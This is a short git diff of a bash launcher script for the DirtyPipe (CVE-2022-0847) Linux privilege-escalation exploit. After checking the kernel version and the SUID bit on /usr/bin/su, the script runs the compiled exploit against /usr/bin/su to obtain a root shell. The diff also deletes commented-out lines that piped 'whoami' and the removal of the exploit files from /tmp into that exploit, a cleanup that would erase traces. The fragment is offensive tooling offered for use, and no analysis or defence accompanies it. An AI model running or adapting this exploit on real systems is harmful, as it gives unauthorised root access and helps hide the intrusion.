@@ -34,9 +34,6 @@ if [[ "${notvulnerable[*]}" = $kernel_version ]];
                 # Execute the exploit to get a root shell.
                 echo "[*] Executing the DirtyPipe exploit..."
                 ./CVE-2022-0847 /usr/bin/su
-                # echo "whoami && rm /tmp/sh /tmp/CVE-2022-0847.c /tmp/CVE-2022-0847" | ./CVE-2022-0847 /usr/bin/su
-                # echo "[+] All commands have been executed!"
-
             else
                 # If SUID bit is not set on /usr/bin/su, terminate the script
                 echo "[!] SUID bit is not set on /usr/bin/su! Terminating script..."
